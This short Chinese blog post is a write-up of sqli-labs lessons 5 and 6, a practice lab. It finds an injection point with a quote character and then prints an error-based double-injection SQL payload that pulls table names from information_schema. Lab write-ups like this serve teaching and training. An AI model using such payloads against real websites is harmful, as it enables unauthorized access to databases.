---
layout: post
title: sqli-labs Lesson-5-6 双重注入
subtitle: 
date: 2020-01-04
author: kevin
header-img: img/green-bg.jpg
catalog: true
tags:
    - sql
    - sql injection
    - security
---



## preface

这篇文章是 sqli-labs 的第五和第六关题解，都涉及到了基于报错的双重注入



## 开始做题



先按部就班吧，我们先找注入点，输入 `'` 后报错，根据报错信息确定了可能存在字符型注入







' union select 1, count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),'-',floor(RAND(0)*2))a from information_schema.tables group by a--+